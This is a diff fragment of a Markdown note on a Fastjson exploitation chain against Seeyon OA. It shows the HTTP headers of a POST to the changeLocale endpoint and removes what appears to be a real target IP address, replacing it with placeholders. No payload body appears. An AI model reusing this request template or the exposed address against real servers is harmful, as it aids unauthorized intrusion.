@@ -14,13 +14,13 @@ title: SeeyonFastjson利用链
 
 ```
 POST /seeyon/main.do?method=changeLocale HTTP/1.1
-Host: 125.35.108.68:9090
+Host: 
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: https://125.35.108.68:9090/
+Origin: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: https://125.35.108.68:9090/seeyon/main.do
+Referer: https://x.x.x.x/seeyon/main.do
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: JSESSIONID=9845FB928E346136D2356099A6862683; loginPageURL=
